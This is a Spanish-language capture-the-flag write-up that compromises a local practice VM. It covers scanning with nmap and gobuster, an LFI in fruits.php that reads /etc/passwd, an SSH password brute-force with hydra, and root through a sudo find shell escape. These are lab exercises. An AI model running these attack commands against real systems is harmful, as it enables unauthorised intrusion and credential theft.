![](images/Pasted%20image%2020250910184201.png)

Una vez importado la .ova en nuestro hipervisor le daremos a iniciar. 

No vamos a nuestro Kali Linux y tenemos que ver cuál es nuestra IP.

```
ip addr
```

![](images/Pasted%20image%2020250910184802.png)

A continuación haremos un escaneo con arp-scan.

```
arp-scan -I eth0 --localnet
```

![](images/Pasted%20image%2020250910185148.png)

Ahora, haremos un escaneo de los puertos abiertos. 

```
nmap -p- --open -sS -T4 -n -Pn -vvv 10.0.2.6
```

![](images/Pasted%20image%2020250910185340.png)

Dos puertos abiertos. 
El primero que vamos a ver es el puerto 80 que es una página web. 
![](images/Pasted%20image%2020250910185523.png)

Lo que podemos hacer es buscar más directorio. 

```
gobuster dir -u http://10.0.2.6/ -w /usr/share/wordlists/rockyou.txt -x txt,py,sh,php
```

Nos sale un directorio fruits.php, así que lo que intentaremos hacer es a ver si podemos encontrar algún tipo de vulnerabilidad entorno a Local File Inclusion.


Usaremos wfuzz. 

```
wfuzz -c --hl=1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.0.2.6/fruits.php?FUZZ=/etc/passwd
```

![](images/Pasted%20image%2020250910192920.png)


Ahora nos vamos al buscador y metemos lo siguiente: 

```
http://10.0.2.6/fruits.php?file=/etc/passwd
```

![](images/Pasted%20image%2020250910193136.png)

Nos encuentra un posible usuario: bananaman

EXPLOTACIÓN

Utilizaremos hydra.

```
hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.6
```

Y ahí tenemos la contraseña. 

![](images/Pasted%20image%2020250910193551.png)

Y ahora entramos por vía ssh.

![](images/Pasted%20image%2020250910193655.png)

![](images/Pasted%20image%2020250910193837.png)

Ahora para hacer escalada de privilegio, nos vamos a la terminal de bananaman y meteremos sudo -l 
![](images/Pasted%20image%2020250910194051.png)

Ahora nos vamos a la página de https://gtfobins.github.io/

Y meteremos lo siguiente: 

```
sudo /usr/bin/find -exec /bin/sh -p \; -quit
```


![](images/Pasted%20image%2020250910194451.png)

Y ya tendríamos los flags. 

